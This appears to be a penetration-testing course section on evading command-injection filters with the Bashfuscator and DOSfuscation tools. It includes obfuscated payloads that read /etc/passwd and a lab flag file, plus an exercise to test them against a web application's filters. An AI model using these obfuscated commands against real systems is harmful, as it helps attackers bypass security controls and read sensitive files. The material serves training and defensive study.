# Evasion Tools

If we are dealing with advanced security tools, we may not be able to use basic, manual obfuscation techniques. In such cases, it may be best to resort to automated obfuscation tools. This section will discuss a couple of examples of these types of tools, one for Linux and another for Windows.

## Linux (Bashfuscator)

A handy tool we can utilize for obfuscating bash commands is Bashfuscator. We can clone the repository from GitHub and then install its requirements:

```bash
git clone https://github.com/Bashfuscator/Bashfuscator
cd Bashfuscator
pip3 install setuptools==65
python3 setup.py install --user
```

Once set up, we can start using it from the `./bashfuscator/bin/` directory. View available options with the help menu:

```bash
cd ./bashfuscator/bin/
./bashfuscator -h
```

To obfuscate a command with the `-c` flag:

```bash
./bashfuscator -c 'cat /etc/passwd'
```

For a shorter, simpler obfuscated command, use specific flags:

```bash
./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
```

Test the output with bash:

```bash
bash -c 'eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"'
```

The obfuscated command executes while remaining completely unrecognizable from the original.

> **Exercise:** Test the above command with your web application to see if it bypasses filters. If not, consider why and how to adjust the payload.

## Windows (DOSfuscation)

DOSfuscation is an interactive obfuscation tool for Windows. Clone and invoke it via PowerShell:

```powershell
git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
cd Invoke-DOSfuscation
Import-Module .\Invoke-DOSfuscation.psd1
Invoke-DOSfuscation
```

Use the tool to obfuscate commands:

```powershell
Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
Invoke-DOSfuscation> encoding
Invoke-DOSfuscation\Encoding> 1
```

Test the obfuscated command on CMD:

```cmd
typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt
```

> **Tip:** On Linux without Windows, use `pwsh` (available by default on Pwnbox) to run DOSfuscation.

For more on advanced obfuscation methods, refer to the Secure Coding 101: JavaScript module.
